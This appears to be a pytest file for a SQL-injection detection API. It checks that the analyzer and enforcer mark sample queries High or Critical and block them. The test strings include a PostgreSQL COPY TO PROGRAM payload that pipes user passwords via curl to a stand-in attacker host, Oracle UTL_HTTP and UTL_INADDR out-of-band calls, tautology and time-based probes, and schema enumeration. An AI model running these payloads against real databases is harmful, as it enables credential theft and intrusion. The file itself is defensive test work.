from __future__ import annotations

from backend.security.request_context import reset_current_service, set_current_service


def _admin_token(client) -> str:
    login = client.post(
        "/api/v1/auth/login",
        json={"email": "admin@example.com", "password": "admin-password-123"},
    )
    assert login.status_code == 200, login.text
    return login.json()["access_token"]


def _analyze(client, query: str) -> dict:
    token = _admin_token(client)
    response = client.post(
        "/api/v1/analyze-sql/query",
        headers={"Authorization": f"Bearer {token}"},
        json={"query": query},
    )
    assert response.status_code == 200, response.text
    return response.json()


def test_sql_analysis_detects_postgres_copy_to_program(client):
    body = _analyze(
        client,
        "COPY (SELECT password FROM users) TO PROGRAM 'curl https://attacker.invalid/exfil --data-binary @-'",
    )

    hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
    combined = body.get("combined_assessment") or {}

    assert "copy_to_program" in hits
    assert combined.get("overall_risk_level") == "Critical"
    assert str(combined.get("suggested_action") or "").upper() == "BLOCK_IMMEDIATE"


def test_sql_analysis_detects_url_encoded_boolean_and_metadata_probes(client):
    samples = [
        ("SELECT id FROM products WHERE id='1'%0aOR%0a'1'='1'--", "quoted_tautology_simple"),
        ("http://example.com/item?id=1 AND LENGTH(@@hostname)=1 --", "metadata_length_probe"),
        ("sleep(__TIME__)#", "time_sleep"),
    ]

    for query, expected_hit in samples:
        body = _analyze(client, query)
        hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
        combined = body.get("combined_assessment") or {}

        assert expected_hit in hits, (query, hits)
        assert combined.get("overall_risk_level") in {"High", "Critical"}
        assert str(combined.get("suggested_action") or "").upper() in {"FLAG_FOR_REVIEW_BLOCK", "BLOCK_IMMEDIATE"}


def test_sql_analysis_detects_double_quote_and_curly_quote_tautologies(client):
    samples = [
        'admin") or ("1"="1',
        "\u2019 or \u20181\u2019=\u20191",
    ]

    for query in samples:
        body = _analyze(client, query)
        hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
        combined = body.get("combined_assessment") or {}

        assert {"double_quoted_tautology", "quoted_tautology_any"} & hits, (query, hits)
        assert combined.get("overall_risk_level") in {"High", "Critical"}


def test_sql_analysis_detects_oracle_oob_primitives(client):
    body = _analyze(client, "SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')")

    hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
    combined = body.get("combined_assessment") or {}

    assert "oracle_utl" in hits
    assert combined.get("overall_risk_level") == "Critical"
    assert str(combined.get("suggested_action") or "").upper() == "BLOCK_IMMEDIATE"


def test_sql_analysis_detects_schema_recon_and_parser_truncation(client):
    samples = [
        (
            "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE()",
            "schema_column_enumeration",
        ),
        ("?id=(1)and(1)=(1)--", "boolean_probe_with_comment"),
        ("INSERT INTO users (username) VALUES ('attacker\\'--');", "quote_comment_truncation"),
    ]

    for query, expected_hit in samples:
        body = _analyze(client, query)
        hits = set(((body.get("heuristics_detection") or {}).get("hits") or []))
        combined = body.get("combined_assessment") or {}

        assert expected_hit in hits, (query, hits)
        assert combined.get("overall_risk_level") in {"High", "Critical"}


def test_sql_enforcer_blocks_high_confidence_dialect_primitives():
    from backend.security import sql_enforcer

    samples = [
        (
            "internet-facing-api",
            "COPY (SELECT password FROM users) TO PROGRAM 'curl https://attacker.invalid/exfil --data-binary @-'",
            "copy_to_program",
        ),
        ("legacy-admin-console", "SELECT UTL_HTTP.REQUEST('http://192.0.2.10/') FROM dual", "oracle_utl"),
        ("public-web-api", "http://example.com/item?id=1 AND LENGTH(@@hostname)=1 --", "metadata_length_probe"),
        (
            "public-web-api",
            "SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = DATABASE()",
            "schema_column_enumeration",
        ),
        ("public-web-api", "?id=(1)and(1)=(1)--", "boolean_probe_with_comment"),
        ("public-web-api", "INSERT INTO users (username) VALUES ('attacker\\'--');", "quote_comment_truncation"),
    ]

    for service, query, expected_hit in samples:
        token = set_current_service(service)
        try:
            decision = sql_enforcer.decide(query, parameters={})
        finally:
            reset_current_service(token)

        assert expected_hit in set(decision.get("hits") or []), decision
        assert str(decision.get("decision") or "").upper() in {"FLAG_FOR_REVIEW_BLOCK", "BLOCK_IMMEDIATE"}, decision
